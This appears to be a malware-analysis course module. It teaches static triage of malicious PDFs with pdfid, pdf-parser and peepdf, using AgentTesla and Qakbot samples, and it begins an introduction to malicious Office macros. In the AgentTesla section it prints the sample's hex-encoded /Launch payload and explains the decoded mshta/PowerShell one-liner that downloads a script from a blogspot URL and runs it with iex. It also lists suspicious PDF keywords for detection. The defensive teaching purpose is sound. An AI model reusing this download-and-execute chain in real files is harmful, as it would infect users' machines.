Some of the common tools required for the analysis of PDF files are mentioned as follows:

- [PDFiD](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdfid.py): This tool is ideal for the `initial triage` of PDFs to identify high-risk files. It scans PDF files for potentially malicious elements, detects suspicious keywords, such as JavaScript or embedded file references, and provides a quick overview of the document structure.
- [PDFParser](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py): This script is useful for pinpointing malicious objects and extracting `suspicious content` from PDF files. Useful for dissecting PDF structure and objects. It provides `detailed insights` into PDF elements, such as `objects`, `streams`, and `metadata`, allowing the user to examine each component in isolation.
- [Peepdf](https://github.com/jesparza/peepdf/wiki/Commands): An advanced tool that enables thorough PDF analysis, including `parsing` and `decryption` of embedded content. With extensive command options, Peepdf helps identify suspicious actions, analyze JavaScript code, and extract or examine embedded objects. It’s ideal for detailed and interactive PDF maldoc analysis.
- [SpiderMonkey](https://blog.didierstevens.com/programs/spidermonkey/): A modified version of Mozilla’s C implementation of JavaScript, with additional functions to assist with malware analysis.

For setting up a local lab VM, consider [REmnux](https://remnux.org/) which comes pre-equipped with all the necessary tools.

However, the tools that we are going to use throughout this section are as follows:

- `PDFiD`
- `PDFParser`
- `Peepdf`

These tools are already installed within the target (VM) machine.

## PDF Analysis Process

The PDF analysis process involves several steps to understand their structure, potential security risks, and content. Technically, the analysis of malicious PDF documents is all about inspecting the indirect references to identify infected embedded files, malicious URLs, and other binary data used to compromise the victim.

The analysis requires a comprehensive approach to identify and understand potential threats embedded within the document. Let's review the important steps to be taken for analyzing various types of malicious PDF samples:

![PDF-Analysis](c2CdmdEwH95d.png)

#### Step 1 : Initial Inspection

- `File Metadata`: Check metadata such as author, creation date, and software used to create the PDF ( `/Author`, `/CreationDate`, `/Producer`) for anomalies or suspicious entries.
- `File Size and Hash`: Note the file size and compute hashes ( `MD5`, `SHA-256`) for integrity verification.

#### Step 2: Static Analysis

During static analysis, we will not run the PDF file. Instead, we will systematically examine the document structure, embedded content, JavaScript, and network interactions. This includes:

- `Document Structure Analysis`: Examine all objects present in a PDF file and associated entries or PDF keywords that start with "/".
  - `Object Streams`: Extract object streams ( `/Type /ObjStm`). If stream objects are present, decode the contents of the object.
  - `Suspicious Keywords`: Check for the following PDF keywords or object entries that are abused by adversaries to hide or execute malicious code. Note that the list is not exhaustive.
    - /OpenAction
    - /AA
    - /JavaScript
    - /JS
    - /AcroForm
    - /XFA
    - /URI
    - /RichMedia
    - /ObjStm
    - /EmbededFile
  - `Content Extraction`: Extract readable text and embedded images for analysis.
  - `JavaScript Analysis`: Identify and analyze embedded JavaScript for malicious activities. These scripts can be included for various reasons, such as:
    - Document manipulation (e.g., redirecting to malicious sites).
    - Exploiting vulnerabilities in PDF readers.
    - Triggering actions without user interaction (e.g., launching executables).

#### Step 3: Dynamic Analysis

If required, we can also perform the dynamic analysis in a sandbox environment as we learned in the " `Introduction to Malware Analysis`" module. This includes opening the PDF file and monitoring the actions it performs on the system.

- `Sandbox Execution`: Open the PDF in a secure, isolated environment or a sandbox to observe its behavior:
  - Monitor system calls, registry changes, process creation/termination and file system modifications.
  - Capture network traffic to detect communication with malicious domains or IP addresses.

* * *

In the following sections, we will begin analyzing malicious PDF documents associated with real-world threat groups. Click on `Mark Complete & Next` to proceed to the next section.


# PDF Document Analysis (AgentTesla)

Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **PDF Analysis Tools**: `C:\Tools\MalDoc\PDF\Tools\`
- **PDF ID**: `C:\Tools\MalDoc\PDF\Tools\pdfid\pdfid.py`
- **PDF Parser**: `C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py`
- **PeePDF**: `PeePDF` is in the environment variables. In the command prompt, simply type `peepdf.exe` and provide the PDF path.
- **AgentTesla PDF Sample**: `C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf`

* * *

## Analysis of PDF document (AgentTesla)

We'll perform the analysis of a malicious PDF sample that runs [Agent Tesla](https://en.wikipedia.org/wiki/Agent_Tesla). Agent Tesla is a .NET based Remote Access Trojan (RAT) and data stealer readily available to actors due to leaked builders. The malware is able to log keystrokes, can access the host's clipboard and crawls the disk for credentials or other valuable information. It has the capability to send information back to its C&C via HTTP(S), SMTP, FTP, or towards a Telegram channel.

The details related to this sample are as follows:

| Name | Description |
| --- | --- |
| File Name | invoice-1580727057.pdf |
| MD5 Hash | feac523f300947e52e2e5ca44221d9d9 |
| Malware Family/Tags | Agent Tesla |
| Detections | [VirusTotal](https://www.virustotal.com/gui/file/a2e7f3210ef4f7fb06606399dd09b873715abc2ce4a45900bd2434f37d55c559/detection) |

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

We'll begin with checking the supported options within `pdfid.py` using `--help`:

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdfid\pdfid.py --help
Usage: pdfid.py [options] [pdf-file|zip-file|url|@file] ...
Tool to test a PDF file

Arguments:
pdf-file and zip-file can be a single file, several files, and/or @file
@file: run PDFiD on each file listed in the text file specified
wildcards are supported

Source code put in the public domain by Didier Stevens, no Copyright
Use at your own risk
https://DidierStevens.com

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -s, --scan            scan the given directory
  -a, --all             display all the names
  -e, --extra           display extra data, like dates
  -f, --force           force the scan of the file, even without proper %PDF
                        header
  -d, --disarm          disable JavaScript and auto launch
  -p PLUGINS, --plugins=PLUGINS
                        plugins to load (separate plugins with a comma , ;
                        @file supported)
  -c, --csv             output csv data when using plugins
  -m MINIMUMSCORE, --minimumscore=MINIMUMSCORE
                        minimum score for plugin results output
  -v, --verbose         verbose (will also raise catched exceptions)
  -S SELECT, --select=SELECT
                        selection expression
  -n, --nozero          supress output for counts equal to zero
  -o OUTPUT, --output=OUTPUT
                        output to log file
  --pluginoptions=PLUGINOPTIONS
                        options for the plugin
  -l, --literalfilenames
                        take filenames literally, no wildcard matching
  --recursedir          Recurse directories (wildcards and here files (@...)
                        allowed)

```

We'll provide the PDF file as an argument to `pdfid.py`. The switch `-e` gives additional information, such as entropy, along with object types and associated object entries, as shown below.

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdfid\pdfid.py C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf -e

PDFiD 0.2.8 C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf
 PDF Header: %PDF-1.5
 obj                    7
 endobj                 7
 stream                 5
 endstream              5
 xref                   0
 trailer                0
 startxref              1
 /Page                  0
 /Encrypt               0
 /ObjStm                1
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            1
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /URI                   0
 /Colors > 2^24         0
 %%EOF                  1
 After last %%EOF       0
 Total entropy:           4.669160 (     51682 bytes)
 Entropy inside streams:  4.571553 (     50692 bytes)
 Entropy outside streams: 0.000000 (       990 bytes)

```

If you look at the output from the top, there are 5 stream objects present in the PDF file, and also an object stream `/objstm`. Recall from previous sections that object streams can conceal other objects in stream objects. Such objects are hidden from analysis tools; therefore, we need to explicitly examine such objects and decode the data to see the hidden objects and associated data.

Also, the keyword `/OpenAction` is very suspicious. As the name implies, this PDF entry is used to dictate the behavior of the document when the user opens it. Malware often abuses this feature to gain code execution via `cmd.exe` or `JavaScript`.

Now, we have all the information needed to start our analysis. We can check the contents of the objects with PDF keywords highlighted by pdfid.py. To start analyzing all objects, and associated keywords, we can use the `pdf-parser.py` script by providing the PDF file as input, as shown below.

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1

PDF Comment '%PDF-1.5\n'

PDF Comment '%\xa7\xe3\xf1\xf1\n'

obj 2 0
 Type: /Catalog
 Referencing: 4 0 R, 5 0 R, 6 0 R, 7 0 R

  <<
    /OpenAction 4 0 R
    /AcroForm 5 0 R
    /Pages 6 0 R
    /Names 7 0 R
    /Type /Catalog
    /Version /1.5
  >>

obj 35 0
 Type: /XObject
 Referencing: 38 0 R
 Contains stream

  <<
    /Matrix [1 0 0 1 -518 -733]
    /Resources 38 0 R
    /Filter /FlateDecode
    /BBox [0 0 1037 1466]
    /Subtype /Form
    /Type /XObject
    /Name /IMG
    /FormType 1
    /Length 35
  >>

obj 37 0
 Type:
 Referencing: 39 0 R
 Contains stream

  <<
    /Matrix [1 0 0 1 0 0]
    /Resources 39 0 R
    /Filter /FlateDecode
    /BBox [0 0 595 842]
    /Length 93
  >>

obj 43 0
 Type: /XObject
 Referencing:
 Contains stream

  <<
    /ColorSpace /DeviceRGB
    /Width 1037
    /BitsPerComponent 8
    /Height 1466
    /Filter /DCTDecode
    /Type /XObject
    /Subtype /Image
    /Length 49033
  >>

obj 1 0
 Type: /ObjStm
 Referencing: 45 0 R
 Contains stream

  <<
    /Type /ObjStm
    /N 39
    /First 295
    /Filter /FlateDecode
    /Length 45 0 R
  >>

obj 45 0
 Type:
 Referencing:

obj 46 0
 Type: /XRef
 Referencing: 2 0 R, 3 0 R
 Contains stream

  <<
    /Size 47
    /Root 2 0 R
    /Info 3 0 R
    /ID [<DD65A9C8234781C4BFD0F4D86DBDE3D6> <DD65A9C8234781C4BFD0F4D86DBDE3D6>]
    /Type /XRef
    /Index [0 47]
    /W [1 2 2]
    /DL 235
    /Filter /FlateDecode
    /Length 120
  >>

startxref 51311

PDF Comment '%%EOF\n'

```

We can investigate the contents of keyword `/OpenAction` by using `--search` or `-s` parameter in `pdf-parser`, as shown below.

![PDF-Analysis](1BVX9NA9BI27.png)

As we can see, the `/OpenAction` entry is inside the object 2. However, the contents of `/OpenAction` reside in object " `4`" because of the " `4 0 R`" indirect object. We can examine object 4 by using command `-o`.

![PDF-Analysis](r6DetxMxbmHW.png)

Interestingly, there is no result for object 4.

The PDFid output that we checked earlier showed `/ObjStm` present in the PDF file. So lets search for it using `pdf-parser`, as shown below, by providing the `-s` or `--search` parameter.

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf --search=ObjStm

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1

obj 1 0
 Type: /ObjStm
 Referencing: 45 0 R
 Contains stream

  <<
    /Type /ObjStm
    /N 39
    /First 295
    /Filter /FlateDecode
    /Length 45 0 R
  >>

```

As we can see, the object 1 is an object stream `/ObjStm`. The `/N` entry denotes the number of objects present in the stream; in our case, there are 39 objects present in the stream. The `/Filter` entry shows the algorithm used to decode the data, which in our case is `FlateDecode`.

Now let's decode `object 1` to see the objects present in the stream. We can use `-f` or `--filter` in `pdf-parser` to decode the object stream. This parameter passes the stream object through filters (FlateDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode, and RunLengthDecode only).

![PDF-Analysis](xWTTC0bq7ykA.png)

The above output shows the decoded object stream. In this output, we can see strings like `JavaScript` and `Action`, which already looks very promising. We'll proceed with our investigation by cleaning up this data.

## Understanding the parsing logic (manual)

Before we proceed, recall that object streams contain dictionaries. The start and end of a dictionary are identified by the symbols `<<` and `>>`, respectively. There are 39 dictionaries present in the object stream. Each dictionary represents an object. Each such object has associated entries or PDF keywords.

Upon doing some cleaning, we get the data below, where each dictionary represents an object

![PDF-Analysis](1LA48yoNZMq0.png)

The challenge here is to identify an object. The object labels can be retrieved by studying the initial numbers mentioned in the decoded object stream:

`3 0 4 68 5 93 6 144 7 182 8 205 9 1116 10 1231 11 1248 12 1282 13 1299 14 1376 15 1440 16 1653 17 1725 18 1754 19 1769 20 1833 21 1885 22 2046 23 2060 24 2099 25 2113 26 2274 27 2283 28 2360 29 2414 30 2474 31 2635 32 2796 33 2957 34 3118 36 3279 38 3316 39 3359 40 3396 41 3412 42 3428 44 3453`

In order to retrieve the labels of each object present in the stream, we need to know how to parse this data. As seen before, the object stream contains a special entry `/First`, which is used to locate the offset of the first object in the stream. This number sequence consists of labels and offsets. The offset value is an offset from the `/First` value in the object stream.

The pattern in the sequence is as follows:

- `/First` is the offset of first object value in the sequence.
- A label is followed by an offset value.
- The position of label in the sequence is the position of corresponding object in the stream.

This way, we can identify objects using their corresponding labels.

![PDF-Analysis](hIuPOwuZxVbe.png)

To understand the logic behind how it works, let's spin up a Python shell and store this whole stream in a variable called `stream`.

![PDF-Analysis](UXS3qoDy0yxi.png)

As we saw earlier, the `/First` offset value in the object stream is 295. Now, we can extract the first segment of the stream starting at offset 295 with a length of 67, because the next entry starts from offset 68. This will show us the first segment of the stream, which is an object with label 3. Then, we can extract the next segment starting at offset 295 + 68. Similarly, we can extract all the hidden objects.

![PDF-Analysis](GaZEaaR9z7mu.png)

This is the logic to parse the stream of `/ObjStm` objects. Once all the hidden objects are extracted from the stream object, we can continue our investigation related to the `/OpenAction` keyword.

![PDF-Analysis](b1lu1fshq6hn.png)

The `/OpenAction` in object 2 pointed to an object 4. Now we can see the contents of object 4 here in the above table.

![PDF-Analysis](bWphNFPcSebt.png)

As we can see, label 4 defines an action that is triggered when the PDF is opened or interacted with in a specific way.

| Label | Offset | Object |
| --- | --- | --- |
| 4 | 68 | <</S /Launch/Win 8 0 R>> |

The key `/S /Launch` indicates that it's a launch action, which is used to run an external application. The `/Win 8 0 R` part references another object (object 8 0) that contains the details of the command to be executed. Let's check object 8.

| Label | Offset | Object |
| --- | --- | --- |
| 8 | 205 | <</P <226A6176617363726970743A5F72B0303D5B27536372697074696E672E46696C6553797374656D4F626A656374272C27575363726970742E5368656C6C272C27706F7765727368656C6C202D657020427970617373202D63205B4E657>/F (C:\\\Windows\\\System32\\\mshta)>> |

The `/P` key holds a long string of hexadecimal characters, which is a payload. When decoded, this is a JavaScript payload designed to perform some malicious action. The `/F` key indicates the file to be executed, which is `C:\\Windows\\System32\\mshta`. This is a legitimate Windows executable used to execute HTML Applications (HTA). In this context, it is being used to execute the JavaScript payload contained in the `/P` key.

![PDF-Analysis](W5cv6TfJVxgi.png)

The object uses JavaScript to execute a series of commands. It creates a new ActiveX object using `WScript.Shell` and runs the PowerShell command with run as the method. It creates a new `Scripting.FileSystemObject` and sets the security protocol to TLS 1.2 to ensure compatibility with modern HTTPS endpoints. The PowerShell command uses `-ep Bypass` to bypass the execution policy, allowing the script to run unrestricted. The command `irm htlfeb24.blogspot.com//////////////////////////////atom.xml | iex` uses `Invoke-RestMethod` (irm) to download a script from the specified URL and execute it (iex). Additionally, the `Start-Sleep -Seconds 5` delays the execution for 5 seconds, possibly to evade some detection mechanisms. The JavaScript code deletes the script file using `Scripting.FileSystemObject`, likely to remove traces.

## Parse the stream object using pdf-parser (automatic)

The above logic was explained in detail so that we can understand how the whole process works. To make this process easier, this can be done automatically using the parameter `--objstm` of the PDF-Parser.

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf --objstm

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1

PDF Comment '%PDF-1.5\n'

PDF Comment '%\xa7\xe3\xf1\xf1\n'

...SNIP...

obj 1 0
 Type: /ObjStm
 Referencing: 45 0 R
 Contains stream

  <<
    /Type /ObjStm
    /N 39
    /First 295
    /Filter /FlateDecode
    /Length 45 0 R
  >>

obj 3 0
 Containing /ObjStm: 1 0
 Type:
 Referencing:

  <<
    /Producer '(3.0.8 \\(5.0.13\\) )'
    /ModDate "(D:20240204061527+01'00')"
  >>

obj 4 0
 Containing /ObjStm: 1 0
 Type:
 Referencing: 8 0 R

  <<
    /S /Launch
    /Win 8 0 R
  >>

obj 5 0
 Containing /ObjStm: 1 0
 Type:
 Referencing: 9 0 R, 10 0 R

  <<
    /Fields [9 0 R]
    /DA (/Helv 0 Tf 0 g )
    /DR 10 0 R
  >>

obj 6 0
 Containing /ObjStm: 1 0
 Type: /Pages
 Referencing: 9 0 R

  <<
    /Type /Pages
    /Kids [9 0 R]
    /Count 1
  >>

obj 7 0
 Containing /ObjStm: 1 0
 Type:
 Referencing: 11 0 R

  <<
    /JavaScript 11 0 R
  >>

obj 8 0
 Containing /ObjStm: 1 0
 Type:
 Referencing:

  <<
    /P <226A6176617363726970743A5F72B0303D5B27536372697074696E672E46696C6553797374656D4F626A656374272C27575363726970742E5368656C6C272C27706F7765727368656C6C202D657020427970617373202D63205B4E65742E53657276696365506F696E744D616E616765725D3A3A536563757269747950726F746F636F6C203D205B4E65742E536563757269747950726F746F636F6C547970655D3A3A546C7331323B2869726D2068746C66656232342E626C6F6773706F742E636F6D2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F61746F6D2E786D6C207C20696578293B53746172742D536C656570202D5365636F6E647320353B272C2772756E275D3B2078B0783D5B5F72B0305B335D2C5F72B0305B305D2C5F72B0305B315D2C5F72B0305B325D5D3B206E657720416374697665584F626A6563742878B0785B325D295B78B0785B305D5D2878B0785B335D2C20302C2074727565293B636C6F736528293B6E657720416374697665584F626A6563742878B0785B315D292E44656C65746546696C6528575363726970742E53637269707446756C6C4E616D65293B22>
    /F '(C:\\\\Windows\\\\System32\\\\mshta)'
  >>

...SNIP...

obj 46 0
 Type: /XRef
 Referencing: 2 0 R, 3 0 R
 Contains stream

  <<
    /Size 47
    /Root 2 0 R
    /Info 3 0 R
    /ID [<DD65A9C8234781C4BFD0F4D86DBDE3D6> <DD65A9C8234781C4BFD0F4D86DBDE3D6>]
    /Type /XRef
    /Index [0 47]
    /W [1 2 2]
    /DL 235
    /Filter /FlateDecode
    /Length 120
  >>

startxref 51311

PDF Comment '%%EOF\n'

```

As checked, the hidden objects can be viewed using the `--objstm` option in `pdf-parser.py`.

## Analysis using PeePDF

Let's also use another tool called PeePDF, which is an interactive tool useful for analyzing PDF documents. We'll start by analyzing the PDF file with the `-i` for interactive mode.

![PDF-Analysis](3UCroKwVWXHP.png)

Let's see the details regarding the object related to the `/Launch` element.

![PDF-Analysis](NeirDho4lpIJ.png)

We can see that it refers to another object, `8 0`. We can open the details of object 8, which reveals the decoded JavaScript that runs the PowerShell command to download a file `atom.xml` (most probably a PowerShell script), and execute it.

Let's now check the `/OpenAction` element as well, i.e., object 2.

![PDF-Analysis](jxglN5qycMLl.png)

This also leads to the final URL where the malicious PowerShell script is hosted (not available at the time of analysis). The script is downloaded and executed using `iex`. Then it goes to sleep and later deletes the script file to hide artifacts.

Let's also see the other additional actions specified in `/AA`.

![PDF-Analysis](1BvUPq9PVbma.png)

This just pops up an alert window. Let's check the `/AA` element 15.

![PDF-Analysis](bdcnVjXi181a.png)

All of these referencing objects refer to the same URI where the script is hosted.

### Extracting Image from the PDF

Let's move to the third object in the `/AA` element, i.e., object 15. This also contains a reference to an `/Img` keyword. The first indirect object that it refers to is object 23.

- Object 23 seems to be an annotation dictionary that specifies certain properties for an annotation (like a screen annotation or a widget). The `/I` entry refers to another object ( **Object 35**), which is likely an image or form to be displayed. The `/IF` entry refers to another object that contains additional information for the image or form.

- Once we open Object 35, we can see that its type is a form XObject, which is a type of PDF object that can be reused multiple times within the document. This form XObject has a transformation matrix ( `/Matrix`) to position and scale it. The `/Resources` entry points to another object ( **Object 38**) containing resources needed by the form. The `/Filter /FlateDecode` entry indicates that the stream data is compressed using the Flate (ZIP) algorithm.

- Object 38 is a resource dictionary for the form XObject in Object 35. The `/XObject` entry maps the name "IMG" to another object ( **Object 40**), which is the image XObject. The `/ProcSet` entry specifies the procedure sets that describe the graphical content, in this case, PDF and image content.

- Object 40 is a dictionary that defines the image XObject. It maps the name "Img" to another object ( **Object 43**), which contains the actual image data.


We can dump the image file as a JPEG file using `-d` in PDF-Parser.

```cmd-session

C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py -o 43 -d image.jpeg C:\Tools\MalDoc\PDF\Demo\Samples\AgentTesla\invoice-1580727057.pdf

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1

obj 43 0
 Type: /XObject
 Referencing:
 Contains stream

  <<
    /ColorSpace /DeviceRGB
    /Width 1037
    /BitsPerComponent 8
    /Height 1466
    /Filter /DCTDecode
    /Type /XObject
    /Subtype /Image
    /Length 49033
  >>

```

In the above output from PDF-Parser, we can see that this XObject has the `/Subtype Image`. It also has a width and a height. This also has a different `/Filter /DCTDecode`, which represents it as a JPEG file.

The screenshot below shows the overall process that we discussed above.

![PDF-Analysis](DaEMyIPmWetZ.png)

The screenshot below shows this image is loaded by the PDF viewer and the link it tries to visit that we extracted earlier.

![PDF-Analysis](503yGYEkL43c.png)


# PDF XObject Analysis (Quakbot)

Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths.

- **PDF ID**: `C:\Tools\MalDoc\PDF\Tools\pdfid\pdfid.py`
- **PDF Parser**: `C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py`
- **PeePDF**: `PeePDF` is in the environment variables. In the command prompt, simply type `peepdf.exe` and provide the PDF path.
- **Quakbot Sample**: `C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf`

* * *

## XObject Analysis - Quakbot

In this section, we'll perform the analysis of a malicious PDF sample that belongs to [Quakbot](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot). Qakbot is a modular information stealer also known as `QBot` or `Pinkslipbot`. It has been active for years since 2007. It has historically been known as a `banking Trojan`, meaning that it steals financial data from infected systems, and a loader using C2 servers for payload targeting and download.

The table below contains the information related to the sample:

| Name | Description |
| --- | --- |
| File Name | Cancellation\_799204\_Dec23.pdf |
| MD5 Hash | B81D2EBEB8B0F6ED3E84E78FFE784777 |
| Malware Family/Tags | Quakbot |
| Detections | [VirusTotal](https://www.virustotal.com/gui/file/f6a8d7b8a80827bd4729cda40e959823c4c30e648a58832623fda8dae20a08ab) |

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

The analysis process starts with the `/XObject` keyword. XObjects are often graphics, such as images. First, we can run PDF Parser with the `-a` option. This will also provide a summary of different objects, just like PDFID.

The command below demonstrates how to run `pdf-parser.py` with the `-a` option:

```cmd-session
C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf -a

```

![PDF-Analysis](nbXZVUPfTQ1n.png)

As we can see, there is one `XObject` with object number 6. Let's dump it using the `-d` flag:

```cmd-session
C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf -o 6 -d object6.jpeg

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1
obj 6 0
 Type: /XObject
 Referencing:
 Contains stream

  <<
    /Type /XObject
    /Subtype /Image
    /Width 1754
    /Height 1240
    /ColorSpace /DeviceRGB
    /BitsPerComponent 8
    /Filter /DCTDecode
    /Length 185396
  >>

```

This should dump the image ( `object6.jpeg`), which looks like the one shown in the screenshot below.

![PDF-Analysis](KvbIYwKApFPr.png)

Further, we can check which objects are referencing this object, in case there is a link contained in this annotation. As we know, PeePDF has an interactive mode, and we can check the references to an object in PeePDF using the command below:

```cmd-session
references to <object id>

```

References can also be checked in `pdf-parser.py` using the `-r` flag.

```cmd-session
C:\> python pdf-parser.py <pdf-file.pdf> -r <object_id>

```

If we want to check which URI it is related to, we can do this via the command-line. Using the `-r` flag, we'll find the objects that are referencing object 6.

```cmd-session
C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf -r 6

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1
obj 2 0
 Type:
 Referencing: 6 0 R

  <<
    /ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
    /Font
    /XObject
      <<
        /I1 6 0 R
      >>
  >>

```

The object that is referring to it is object 2. It contains some fonts and a `/ProcSet` entry that specifies the procedure sets to describe the graphical content. Let's see what object refers to object 2.

```cmd-session
C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf -r 2

```

![PDF-Analysis](mMUWQONaxraN.png)

Let's check object 5 to view the annotation and see if there are any links.

![PDF-Analysis](diAIgcZhF1md.png)

If we open the PDF file, we can hover over the image and see the link to the additional zip file.

![PDF-Analysis](uIWbc7NvjJsP.png)

We can also search for all URIs in the PDF document using the `-s /URI` flag in PDF parser.

```cmd-session
C:\> python C:\Tools\MalDoc\PDF\Tools\pdf-parser\pdf-parser.py C:\Tools\MalDoc\PDF\Demo\Samples\obama230\Cancellation_799204_Dec23.pdf -s /URI

```

![PDF-Analysis](4HQ0TRhdxwxi.png)


# Analysis of Malicious Office Files

**Note:** This is an introductory section related to Malicious Office Files. We'll provide an overview and cover Office Files and Macro analysis in detail in the next sections.

## Introduction

Analyzing malicious Office files is important because Office documents are common attack vectors due to their widespread use and support for macros and embedded objects. Understanding how these attacks work helps in developing effective defenses. Analysis can reveal specific techniques, tactics, and procedures (TTPs) used by threat actors, aiding in attribution and understanding the threat landscape.

## Common Attacks Using Malicious Office Files

Malicious Office documents, such as Word and Excel files, have been widely used by attackers to deliver malware. These documents often leverage macros, embedded objects, or scripting to execute malicious code. Analyzing such documents requires a systematic approach to identify and understand the malicious components.

- `Macro-Based Attacks`: Attackers embed malicious macros in Office files. When the user enables macros, the malicious code executes, often downloading and executing additional payloads.
- `Embedded Objects`: Malicious objects like OLE objects or ActiveX controls can be embedded in Office files. When opened, these objects can execute code or perform actions without the user's consent.
- `Exploiting Vulnerabilities`: Attackers exploit vulnerabilities in Office applications to execute code. For example, using crafted files to exploit buffer overflow vulnerabilities.
- `Phishing and Social Engineering`: Office files are often used in phishing campaigns to trick users into enabling macros or clicking on malicious links.

## Phishing

The MITRE ATT&CK [framework](https://attack.mitre.org/) provides a comprehensive matrix of techniques and tactics used by threat actors. One of the most common techniques, [Phishing](https://attack.mitre.org/techniques/T1566/), within the framework relates to malicious Office files, where adversaries send phishing emails containing attached Office documents with macros to perform malicious actions.

The screenshot below shows the sub-technique [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) of Phishing, which mentions the use of Microsoft Office documents in the Spearphishing Attachments.

![office-analysis](KEapicInKwyq.png)

There are many procedure examples on the [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) page of the MITRE ATT&CK framework where this technique is used by various threat actors to send malicious Office documents as email attachments to target users.

![office-analysis](y0WEUJTIDT97.png)

You can read procedure examples on the [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) page and explore the different articles mentioned by MITRE for more information.

## Macros

Macros in Microsoft Office applications allow users to automate repetitive tasks by recording a series of commands that can be executed with a single action. Macros are typically written in Visual Basic for Applications (VBA), a programming language developed by Microsoft, supported across all Microsoft Office products.

### Types of Macro Files

Office Open XML (OOXML) files such as `.docx`, `.xlsx`, and `.pptx` cannot store macros by default. Only specific file formats can contain VBA macros, such as:

- `Word`: .docm, .dotm
- `Excel`: .xlsm, .xltm
- `PowerPoint`: .pptm, .potm

These formats end with an ' `m`' to indicate that they can contain macros, making it easier to identify files that potentially carry executable code. However, the extension can be renamed by users. If a document contains macros, it shows a security warning that says ' `Macros have been disabled.`'

The screenshot below shows an example of an MS Office document (opened in MS Word) displaying a security warning with a button to enable macros.

![office-analysis](7b442Dja60t5.png)

It's best practice not to click on "Enable Content" button in unfamiliar documents, as doing so can expose users to potential phishing attacks.

Other Office applications also show a warning related to macros. For example, the screenshot below shows the security warning by `OpenOffice` upon opening the Macro-enabled document.

![office-analysis](0djyrRp8CbxG.png)

### Why Macros Analysis is Important?

Office documents use their own scripting language, just like PDFs. In this case, the language is `VBA (Visual Basic for Applications)`. VBA Macros are very powerful as they can execute the Windows APIs directly. They can interact with the operating system to perform various suspicious operations, such as downloading malware and executing malicious code. Analyzing macros is crucial because they can be exploited by attackers to compromise systems. Attackers often use macros to:

- `Modify Files`: Alter or delete critical files on the system.
- `Execute Code`: Run malicious scripts or binaries, leading to further compromise.
- `Deliver Payloads`: Download and execute additional malware from remote servers.

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **OLEID**: `C:\Tools\MalDoc\Office\Tools\oletools\oleid.py`
- **OLEDIR**: `C:\Tools\MalDoc\Office\Tools\oletools\oledir.py`
- **RTF Dump**: `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py`
- **QuasarRAT**: `C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx`
